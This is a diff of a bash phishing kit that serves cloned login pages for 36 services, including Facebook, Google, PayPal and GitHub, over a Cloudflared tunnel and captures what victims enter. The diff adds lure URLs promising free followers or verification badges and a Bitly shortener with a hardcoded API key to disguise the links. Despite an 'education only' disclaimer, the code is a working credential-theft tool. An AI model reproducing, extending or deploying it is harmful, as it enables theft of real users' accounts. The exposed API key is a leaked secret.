@@ -9,42 +9,36 @@ BLUE="\033[0;34m"
 MAGENTA="\033[0;35m"
 CYAN="\033[0;36m"
 WHITE="\033[0;37m"
-MAGENTA='\033[1;35m'
-YELLOW2='\033[1;33m'
-
-BRIGHT_BLACK="\033[1;90m"
-BRIGHT_RED="\033[1;91m"
+ORANGE='\033[1;33m'
 BRIGHT_GREEN="\033[1;92m"
-BRIGHT_YELLOW="\033[1;93m"
-BRIGHT_BLUE="\033[1;94m"
-BRIGHT_MAGENTA="\033[1;95m"
 BRIGHT_CYAN="\033[1;96m"
-BRIGHT_WHITE="\033[1;97m"
-
+BRIGHT_YELLOW="\033[1;93m"
 NC="\033[0m"  # Reset
 
 # Globals
 HOST="127.0.0.1"
 PHISH_DIR="sites"
-SITE="facebook"
-PORT="" # Only once random
+SITE=""
+PORT=""
+MASK=""
+WEBSITE=""
 
-# Functions
 banner() {
     clear
     echo -e "${BRIGHT_CYAN}"
-    echo -e "      █████▒▒ PHISHER-STYLE SITES CLONE ▒▒█████
-
-                "  ████▒▒ ${YELLOW2}V1.1${BRIGHT_CYAN} ▒▒████"
-    
-  Feedback And Tell Which Phishing Sites You want         
-             Instagram = @Shyam.npl1 
-             Youtube = @FactStreamZS"
+    echo -e "      █████▒▒ PHISHER-STYLE SITES CLONE ▒▒█████"
+    echo -e "                  
+                 ████▒▒ ${YELLOW}V1.1${BRIGHT_CYAN} ▒▒████"
+    echo -e ""
+    echo -e "  Feedback And Tell Which Phishing Sites You Want"
+    echo -e "             Instagram = @Shyam.npl1"
+    echo -e "             YouTube = @FactStreamZS"
     echo -e "${NC}"
 }
 
 banner_small() {
-    echo -e "${BRIGHT_GREEN}▌ PHISHER ▐${NC}"
+    echo -e "${BRIGHT_GREEN}  
+                     ▌ PHISHER ▐${NC}"
 }
 
 install_deps() {
@@ -75,27 +69,152 @@ check_update() {
 
 select_site() {
     banner_small
-    echo -e "\n${BRIGHT_CYAN}[1] Facebook"
-    echo -e "${BRIGHT_CYAN}[2] Instagram"
-    echo -e "${BRIGHT_CYAN}[3] Gmail"
-    echo -e "${BRIGHT_CYAN}[0] Exit"
+    echo -e ""
+    echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt"
+    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo"
+    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin"
+    echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox"
+    echo -e "${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo"
+    echo -e "${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress"
+    echo -e "${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex"
+    echo -e "${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} Stackoverflw"
+    echo -e "${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk"
+    echo -e "${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} Xbox"
+    echo -e "${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github"
+    echo -e "${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox       ${RED}[${WHITE}36${RED}]${ORANGE} Garena"
+    echo -e ""
+    echo -e "${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit"
     echo -ne "\n${BRIGHT_CYAN}[>] Select phishing site: ${NC}"
     read choice
+
     case $choice in
-        1) SITE="facebook" ;;
-        2) SITE="instagram" ;;
-        3) SITE="gmail" ;;
+        1) site_facebook ;;
+        2) site_instagram ;;
+        3) site_gmail ;;
+        29) site_vk ;;
+        99) about ;;
         0) exit ;;
-        *) echo -e "${RED}[!] Invalid option"; sleep 1; select_site ;;
+        *)
+            normal_sites $choice
+            ;;
     esac
 }
 
+normal_sites() {
+    case $1 in
+        4) WEBSITE="microsoft" ;;
+        5) WEBSITE="netflix" ;;
+        6) WEBSITE="paypal" ;;
+        7) WEBSITE="steam" ;;
+        8) WEBSITE="twitter" ;;
+        9) WEBSITE="playstation" ;;
+        10) WEBSITE="tiktok" ;;
+        11) WEBSITE="twitch" ;;
+        12) WEBSITE="pinterest" ;;
+        13) WEBSITE="snapchat" ;;
+        14) WEBSITE="linkedin" ;;
+        15) WEBSITE="ebay" ;;
+        16) WEBSITE="quora" ;;
+        17) WEBSITE="protonmail" ;;
+        18) WEBSITE="spotify" ;;
+        19) WEBSITE="reddit" ;;
+        20) WEBSITE="adobe" ;;
+        21) WEBSITE="deviantart" ;;
+        22) WEBSITE="badoo" ;;
+        23) WEBSITE="origin" ;;
+        24) WEBSITE="dropbox" ;;
+        25) WEBSITE="yahoo" ;;
+        26) WEBSITE="wordpress" ;;
+        27) WEBSITE="yandex" ;;
+        28) WEBSITE="stackoverflow" ;;
+        30) WEBSITE="xbox" ;;
+        31) WEBSITE="mediafire" ;;
+        32) WEBSITE="gitlab" ;;
+        33) WEBSITE="github" ;;
+        34) WEBSITE="discord" ;;
+        35) WEBSITE="roblox" ;;
+        36) WEBSITE="garena" ;;
+        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; select_site ;;
+    esac
+    tunnel_menu
+}
+
+site_facebook() {
+    echo -e "
+${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page"
+    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page"
+    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page"
+    echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page"
+    echo ""
+
+    read -p "$(echo -e "${RED}[${WHITE}-${RED}]${BRIGHT_GREEN} Select an option : ${NC}")" fb_option
+    case $fb_option in
+        1) WEBSITE="facebook" MASK='https://blue-verified-badge-for-facebook-free' ;;
+        2) WEBSITE="fb_advanced" MASK='https://vote-for-the-best-social-media' ;;
+        3) WEBSITE="fb_security" MASK='https://make-your-facebook-secured-and-free-from-hackers' ;;
+        4) WEBSITE="fb_messenger" MASK='https://get-messenger-premium-features-free' ;;
+        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; site_facebook ;;
+    esac
+    tunnel_menu
+}
+
+site_instagram() {
+    echo -e "
+${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page"
+    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page"
+    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page"
+    echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page"
+    echo ""
+
+    read -p "$(echo -e "${RED}[${WHITE}-${RED}]${BRIGHT_GREEN} Select an option : ${NC}")" ig_option
+    case $ig_option in
+        1) WEBSITE="instagram" MASK='https://get-unlimited-followers-for-instagram' ;;
+        2) WEBSITE="ig_followers" MASK='https://get-unlimited-followers-for-instagram' ;;
+        3) WEBSITE="insta_followers" MASK='https://get-1000-followers-for-instagram' ;;
+        4) WEBSITE="ig_verify" MASK='https://blue-badge-verify-for-instagram-free' ;;
+        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; site_instagram ;;
+    esac
+    tunnel_menu
+}
+
+site_gmail() {
+    echo -e "
+${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page"
+    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page"
+    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll"
+    echo ""
+
+    read -p "$(echo -e "${RED}[${WHITE}-${RED}]${BRIGHT_GREEN} Select an option : ${NC}")" gm_option
+    case $gm_option in
+        1) WEBSITE="google" MASK='https://get-unlimited-google-drive-free' ;;
+        2) WEBSITE="google_new" MASK='https://get-unlimited-google-drive-free' ;;
+        3) WEBSITE="google_poll" MASK='https://vote-for-the-best-social-media' ;;
+        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; site_gmail ;;
+    esac
+    tunnel_menu
+}
+
+site_vk() {
+    echo -e "
+${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page"
+    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page"
+    echo ""
+
+    read -p "$(echo -e "${RED}[${WHITE}-${RED}]${BRIGHT_GREEN} Select an option : ${NC}")" vk_option
+    case $vk_option in
+        1) WEBSITE="vk" MASK='https://vk-premium-real-method-2020' ;;
+        2) WEBSITE="vk_poll" MASK='https://vote-for-the-best-social-media' ;;
+        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; site_vk ;;
+    esac
+    tunnel_menu
+}
+
 setup_site() {
-    if [ ! -d "$PHISH_DIR/$SITE" ]; then
-        echo -e "${RED}[!] Site files for '$SITE' not found.${NC}"
+    if [ ! -d "$PHISH_DIR/$WEBSITE" ]; then
+        echo -e "${RED}[!] Site files for '$WEBSITE' not found.${NC}"
         exit 1
     fi
-    cp -rf "$PHISH_DIR/$SITE"/* .
+    cp -rf "$PHISH_DIR/$WEBSITE"/* .
 }
 
 capture_data() {
@@ -115,11 +234,10 @@ start_localhost() {
 }
 
 start_cloudflared() {
-    if [[ -z "$PORT" ]]; then
-        random_port
-    fi
-
-    echo -e "${BRIGHT_GREEN}[+] Launching Cloudflared tunnel on port $PORT...${NC}"
+    BITLY_API_KEY="ef268f2a6d35c286b6cad7de99de658e2d6f34f4"
+    random_port
+    echo -e "\n${BRIGHT_GREEN}[+] Launching Cloudflared tunnel on port $PORT...${NC}
+    "
     setup_site
     php -S "$HOST:$PORT" > /dev/null 2>&1 &
     sleep 5
@@ -127,29 +245,57 @@ start_cloudflared() {
     sleep 8
 
     URL=$(grep -o 'https://[-a-zA-Z0-9]*\.trycloudflare.com' .cfurl.log | head -n 1)
-
-    if [[ $URL ]]; then
-        echo -e "${BRIGHT_GREEN}[✓] LIVE URL: ${BRIGHT_CYAN}$URL${NC}"
-        capture_data
+if [[ $URL ]]; then
+    SHORT_URL=$(shorten_url "$URL")
+    echo -e "${BRIGHT_GREEN}[✓] LIVE URL: ${BRIGHT_CYAN}$URL${NC}
+    "
+    echo -e "${BRIGHT_GREEN}[✓] Shortened URL: ${BRIGHT_CYAN}$SHORT_URL${NC}
+    "
+    capture_data
     else
-        echo -e "${RED}[!] Faild To Generate url Try 4-5 Times .${NC}"
+        echo -e "${RED}[!] Failed to generate Cloudflared URL.${NC}"
     fi
 }
 
-attack_menu() {
-    echo -e "\n${BRIGHT_YELLOW}[1] Localhost (Random Port)"
-    echo -e "${BRIGHT_YELLOW}[2] Cloudflared"
-    echo -e "${BRIGHT_YELLOW}[3] Back to Main Menu"
-    echo -e "${BRIGHT_YELLOW}[0] Exit"
-    echo -ne "\n${BRIGHT_YELLOW}[>] Choose attack method: ${NC}"
-    read option
-    case $option in
+
+shorten_url() {
+    local long_url="$1"
+    response=$(curl -s -X POST "https://api-ssl.bitly.com/v4/shorten" \
+        -H "Authorization: Bearer $BITLY_API_KEY" \
+        -H "Content-Type: application/json" \
+        -d "{\"long_url\": \"$long_url\"}")
+    
+    echo "$response" | grep -o '"link": *"[^"]*' | cut -d'"' -f4
+}
+
+
+tunnel_menu() {
+    echo -e "\n${RED}[${WHITE}01${RED}]${BRIGHT_YELLOW} Localhost  ( ${BRIGHT_GREEN}Random Port${BRIGHT_YELLOW} )"
+    echo -e "${RED}[${WHITE}02${RED}]${BRIGHT_YELLOW} Cloudflared"
+    echo -e "${RED}[${WHITE}03${RED}]${BRIGHT_YELLOW} Back to Site Selection"
+    echo -e "${RED}[${WHITE}04${RED}]${BRIGHT_YELLOW} Exit"
+    echo -ne "\n${BRIGHT_CYAN}[>] Choose attack method: ${NC}"
+    read tunnel_option
+
+
+    case $tunnel_option in
         1) start_localhost ;;
         2) start_cloudflared ;;
-        3) main_menu ;;
+        3) select_site ;;
         0) exit ;;
-        *) echo -e "${RED}[!] Invalid option"; sleep 1; attack_menu ;;
+        *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1; tunnel_menu ;;
     esac
+}
+
+about() {
+    clear
+    echo -e "${BRIGHT_CYAN}About This Tool:${NC}"
+    echo -e "${WHITE}This tool is developed for phishing site cloning education only.${NC}"
+    echo -e "${WHITE}Instagram: @Shyam.npl1${NC}"
+    echo -e "${WHITE}YouTube: @FactStreamZS${NC}"
+    echo -ne "\n${BRIGHT_GREEN}Press Enter to return to menu...${NC}"
+    read
+    main_menu
 }
 
 main_menu() {
@@ -157,7 +303,6 @@ main_menu() {
     install_deps
     check_update
     select_site
-    attack_menu
 }
 
 # Start
